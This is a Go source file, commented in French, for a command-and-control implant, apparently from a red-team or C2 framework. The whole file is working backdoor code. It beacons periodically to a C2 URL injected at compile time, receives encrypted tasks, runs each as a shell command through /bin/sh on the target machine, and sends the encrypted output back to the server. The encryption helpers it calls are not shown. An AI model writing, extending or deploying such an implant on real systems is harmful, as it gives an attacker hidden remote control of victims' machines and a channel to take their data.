package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

// C2_URL est l'URL du serveur de Command & Control.
// Cette valeur sera injectée au moment de la compilation.
var C2_URL = "http://localhost:8000/c2/implant/callback"
var AgentID = "default_agent"
var EncryptionKey = "_THIS_IS_A_DEFAULT_32_BYTE_KEY_"

// Task représente une commande reçue du C2.
type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

// TaskResult représente le résultat d'une commande exécutée.
type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
}

type EncryptedPayload struct {
	Data string `json:"data"`
}

func main() {
	// Boucle infinie pour contacter le C2 périodiquement (beaconing).
	for {
		// Demande une nouvelle tâche au C2.
		task, err := getTask()
		if err != nil {
			fmt.Println("Error getting task:", err)
			time.Sleep(30 * time.Second) // Attend avant de réessayer en cas d'erreur.
			continue
		}

		// Si aucune tâche n'est disponible, attend avant de redemander.
		if task.Command == "" {
			time.Sleep(10 * time.Second)
			continue
		}

		// Exécute la tâche.
		output := executeCommand(task.Command)

		// Envoie le résultat au C2.
		sendResult(TaskResult{TaskID: task.ID, Output: output})
	}
}

// getTask contacte le C2 pour obtenir une nouvelle tâche.
func getTask() (*Task, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", C2_URL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("X-Agent-ID", AgentID)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Le corps est chiffré, on le déchiffre.
	var encryptedPayload EncryptedPayload
	if err := json.Unmarshal(body, &encryptedPayload); err != nil {
		// Si le payload n'est pas du JSON chiffré, c'est peut-être une réponse "pas de tâche" non chiffrée.
		var task Task
		if json.Unmarshal(body, &task) == nil && task.Command == "" {
			return &task, nil
		}
		return nil, fmt.Errorf("error unmarshalling payload: %v", err)
	}

	decryptedData, err := Decrypt(encryptedPayload.Data, []byte(EncryptionKey))
	if err != nil {
		return nil, fmt.Errorf("error decrypting task: %v", err)
	}

	var task Task
	err = json.Unmarshal(decryptedData, &task)
	if err != nil {
		return nil, fmt.Errorf("error unmarshalling decrypted task: %v", err)
	}

	return &task, nil
}

// executeCommand exécute une commande shell sur la machine cible.
func executeCommand(command string) string {
	cmd := exec.Command("/bin/sh", "-c", command)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error executing command: %s\n%s", err, out.String())
	}

	return out.String()
}

// sendResult envoie le résultat de la tâche au C2.
func sendResult(result TaskResult) {
	jsonData, err := json.Marshal(result)
	if err != nil {
		fmt.Println("Error marshalling result:", err)
		return
	}

	// Chiffre le résultat
	encryptedData, err := Encrypt(jsonData, []byte(EncryptionKey))
	if err != nil {
		fmt.Println("Error encrypting result:", err)
		return
	}

	// Prépare le payload chiffré
	payload := EncryptedPayload{Data: encryptedData}
	encryptedPayloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling encrypted payload:", err)
		return
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", C2_URL, bytes.NewBuffer(encryptedPayloadBytes))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", AgentID)

	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Error sending result:", err)
	}
}
